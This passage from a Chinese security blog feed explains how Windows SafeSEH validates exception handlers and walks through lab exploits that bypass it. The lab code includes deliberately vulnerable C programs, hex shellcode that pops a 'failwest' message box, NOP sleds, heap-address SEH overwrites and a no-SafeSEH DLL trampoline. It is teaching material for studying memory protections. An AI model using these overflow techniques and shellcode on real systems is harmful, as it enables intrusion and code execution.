class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x61\x30\x5F\x5F\x68\x68\x75\x31\x79\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(tt,shellcode,<span class="number">450</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line"><span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;dep-机制的保护原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#dep-机制的保护原理&quot;&gt;&lt;/a&gt; DEP 机制的保护原理&lt;/h1&gt;
&lt;p&gt;溢出攻击的&lt;strong&gt;根源&lt;/strong&gt;在于计算机未明确区分数据和代码，DEP（数</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="DEP" scheme="https://www.rgzzplus.com/tags/DEP/"/>
    
  </entry>
  
  <entry>
    <title>亡羊补牢：SafeSEH</title>
    <link href="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/"/>
    <id>https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/</id>
    <published>2022-06-09T11:31:34.000Z</published>
    <updated>2022-06-09T11:34:04.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="safeseh-对异常处理的保护原理"><a class="markdownIt-Anchor" href="#safeseh-对异常处理的保护原理"></a> SafeSEH 对异常处理的保护原理</h1><h2 id="safeseh的原理"><a class="markdownIt-Anchor" href="#safeseh的原理"></a> SafeSEH的原理</h2><p>在程序调用异常处理函数前，对要调用的异常处理函数进行一系列的有效性校验，当发现异常处理函数不可靠时终止异常处理函数的调用。SafeSEH 需要操作系统和编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。</p><h3 id="编译器在safeseh-机制中所做的工作"><a class="markdownIt-Anchor" href="#编译器在safeseh-机制中所做的工作"></a> 编译器在SafeSEH 机制中所做的工作</h3><p>启用/SafeSEH 链接选项后，编译器在编译程序的时候将程序所有的异常处理函数地址提取出来，编入一张安全 S.E.H 表，并将这张表放到程序的映像中。当程序调用异常处理函数的时候，会将函数地址与安全 S.E.H 表进行匹配，检查调用的异常处理函数是否位于安全 S.E.H 表中。</p><p>比较同一段代码在 VC++ 6. 0 （没有SafeSEH机制）和 VS 2008（有SafeSEH机制）分别编译后安全 S.E.H 表的区别。VS 2008 在编译程序时将程序中的异常处理函数的地址提取出来放到安全 S.E.H 表中。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605173356294.png" alt="image-20220605173356294"></p><h3 id="操作系统在safeseh机制中的作用"><a class="markdownIt-Anchor" href="#操作系统在safeseh机制中的作用"></a> 操作系统在SafeSEH机制中的作用</h3><p>通过前面（文章《形形色色的内存攻击技术》中）对S.E.H的的介绍，我们知道异常处理函数的调用是通过 RtlDispatchException()函数处理实现的，SafeSEH机制也是从这里开始的。</p><p>保护措施：</p><p>（1）检查<strong>异常处理链</strong>是否位于当前程序的栈中，如下图所示。如果不在当前栈中，程序将终止异常处理函数的调用。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174009415.png" alt="image-20220605174009415"></p><p>（2）检查<strong>异常处理函数的指针</strong>是否指向当前程序的栈中，如上图所示。如果指向当前栈中，程序将终止异常处理函数的调用。</p><p>（3）在前面两项检查都通过后，程序调用 RtlIsValidHandler()，来对异常处理函数的有效性进行验证。</p><h4 id="rtlisvalidhandler-都做了哪些工作呢"><a class="markdownIt-Anchor" href="#rtlisvalidhandler-都做了哪些工作呢"></a> RtlIsValidHandler() 都做了哪些工作呢？</h4><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174617111.png" alt="image-20220605174617111"></p><p>首先，该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。</p><p>（ 1）判断程序是否设置了 IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略，函数直接返回校验失败。<br>（ 2）检测程序是否包含安全 S.E.H 表。如果程序包含安全 S.E.H 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。<br>（ 3）判断程序是否设置 ILonly 标识。如果设置了这个标识，<a href="http://xn--uirrueg070benjhh4a8d0anda.NET">说明该程序只包含.NET</a> 编译人中间语言，函数直接返回校验失败。<br>（ 4）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。</p><p>如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行 DEP 相关检测，函数依次进行如下校验。<br>（ 1）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。<br>（ 2）判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。</p><p>RtlIsValidHandler()函数的伪代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">RtlIsValidHandler</span><span class="params">(handler)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (handler is in an image) &#123; <span class="comment">//在加载模块内存空间内</span></span><br><span class="line"><span class="keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="keyword">if</span> (image has a SafeSEH table)&#123; <span class="comment">//含有安全 S.E.H 表，说明程序启用 SafeSEH</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)<span class="comment">//异常处理函数地址出现在安全 S.E.H 表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span> (image is a .NET assembly with the ILonly flag <span class="built_in">set</span>) <span class="comment">//只包含 IL</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123; <span class="comment">//跑到不可执行页上了</span></span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//DEP 关闭</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION; <span class="comment">//抛出访问违例异常</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is not in an image) &#123; <span class="comment">//在加载模块内存之外，并且在可执行页上</span></span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">            <span class="comment">//允许在加载模块内存空间外执行</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE; <span class="comment">//前面条件都不满足的话只能允许这个异常处理函数执行了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RtlIsValidHandler() 函数在哪些情况下允许异常处理函数执行？<br>（ 1）异常处理函数位于加载模块内存范围之外， DEP 关闭。<br>（ 2）异常处理函数位于加载模块内存范围之内，相应模块未启用 SafeSEH（安全 S.E.H 表为空），同时相应模块不是纯 IL。<br>（ 3）异常处理函数位于加载模块内存范围之内，相应模块启用 SafeSEH（安全 S.E.H 表不为空），异常处理函数地址包含在安全 S.E.H 表中。</p><p>我们来分析一下这三种情况攻击成功的可行性。<br>（ 1）现在我们只考虑 SafeSEH，不考虑 DEP，针对 DEP 的讨论我们放到下一节中。排除DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入 shellcode 执行，这点还是比较容易实现的。<br>（ 2）在第二种情况中，我们可以利用未启用 SafeSEH 模块中的指令作为跳板， 转入 shellcode 执行，这也是为什么我们说 SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一个未启用的 SafeSEH 模块也不是一件很困难的事情。<br>（ 3）这种情况下我们有两种思路可以考虑，一是清空安全 S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全 S.E.H 表中。由于安全 S.E.H 表的信息在内存中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。</p><p>通过以上分析可以得出结论：突破 SafeSEH 还是可以做到的。您可能会问这些方法貌似有点复杂，有没有更为简便的方法突破呢？很负责地告诉您，有两种更为简便直接方法可以突破 SafeSEH。<br>（ 1）不攻击 S.E.H（太邪恶了），可以考虑覆盖返回地址或者虚函数表等信息。<br>（ 2）利用 S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果 S.E.H 中的异常函数指针指向堆区，即使安全校验发现了 S.E.H 已经不可信，仍然会调用其已被修改过的异常处理函数，因此只要将 shellcode 布置到堆区就可以直接跳转执行！</p><blockquote><p>请注意本节所有关于绕过 SafeSEH 机制的讨论均不考虑 DEP 的影响</p></blockquote><h1 id="攻击返回地址绕过-safeseh"><a class="markdownIt-Anchor" href="#攻击返回地址绕过-safeseh"></a> 攻击返回地址绕过 SafeSEH</h1><p>如果碰到一个程序，他启用了 SafeSEH 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护（我们不考虑这种事情发生的概率，而且这种漏洞的的确确存在），攻击者肯定会直接攻击函数返回地址。实验请看《栈中的守护天使：GS》，这里不再重复介绍了。</p><h1 id="利用虚函数绕过-safeseh"><a class="markdownIt-Anchor" href="#利用虚函数绕过-safeseh"></a> 利用虚函数绕过 SafeSEH</h1><p>利用思路和我们在《栈中的守护天使：GS》中介绍的类似，通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理， SafeSEH 也就只是个摆设。在这我们就不做过多介绍了。</p><h1 id="从堆中绕过-safeseh"><a class="markdownIt-Anchor" href="#从堆中绕过-safeseh"></a> 从堆中绕过 SafeSEH</h1><p>演示如何利用堆绕过 SafeSEH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xF8\x3D\x39\x00&quot;</span><span class="comment">//address of shellcode in heap</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//char shellcode[]=</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * buf=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,shellcode);</span><br><span class="line">    test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验思路：<br>（ 1）首先在堆中申请 500 字节的空间，用来存放 shellcode。<br>（ 2）函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 3）用 shellcode 在堆中的起始地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理，进而跳转到堆中的 shellcode 执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th><th></th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明： shellcode 中尾部的 0x00393DF8 为 shellcode 在堆中的起始地址，该地址可能在实验过程中需要重新设置。</p></blockquote><p>首先将 shellcode 填充为多个 0x90，然后将程序用 VS2008 编译好后运行，由于我们再程序中加入了 int 3 指令，程序会自动中断，我们选择调试后系统会调用默认调试器进行调试，程序会自动停在 __asm int 3 处 。</p><p>如下图，程序中断前刚刚完成堆中空间申请，此时寄存器 EAX 中存放着申请空间的首地址 0x00393DF8，这个地址在不同机器上会有所不同。有了 shellcode的首地址，我们还需要确定shellcode需要填充多少字节才能淹没异常函数的地址。继续运行程序，中断在 test 函数中字符串复制结束时。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605193524256.png" alt="image-20220605193524256"></p><p>如下图所示，被溢出的字符串起始地址为 0x0012FE8C，S.E.H 异常处理函数指针位于 0x0012FFB0+4 的位置。所以我们使用 300 个字节就能覆盖掉异常处理函数指针。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194838798.png" alt="image-20220605194838798"></p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194942893.png" alt="image-20220605194942893"></p><p>布置 shellcode：</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605195648181.png" alt="image-20220605195648181"></p><p>验证我们的分析是否正确。程序依然会被 INT 3 中断，等OllyDbg运行后 按Ctrl+G 跳转到 0x00393DF8 设置断点，然后按F9继续运行，可以看到程序在 0x00393DF8 处中断，说明我们已经成功绕过SafeSEH 转入 shellcode 执行。继续执行就会看到 failwest 对话框了。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605200429987.png" alt="image-20220605200429987"></p><h1 id="利用未启用-safeseh-模块绕过-safeseh"><a class="markdownIt-Anchor" href="#利用未启用-safeseh-模块绕过-safeseh"></a> 利用未启用 SafeSEH 模块绕过 SafeSEH</h1><p>SafeSEH 对于未启用 SafeSEH 模块中的异常处理的校验过程：如果模块未启用 SafeSEH，并且该模块包含除中间语言（IL）之外的其它语言，这个异常处理就可以被执行。所以我们可以利用未启用 SafeSEH 的模块中的指令作为跳板来绕过 SafeSEH。</p><p>实验思路：构造一个不启用 SafeSEH 的 dll，然后将其加载，并通过它里面的指令作为跳板实现 SafeSEH 的绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">jump</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">    pop eax</span><br><span class="line">    pop eax</span><br><span class="line">    retn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span 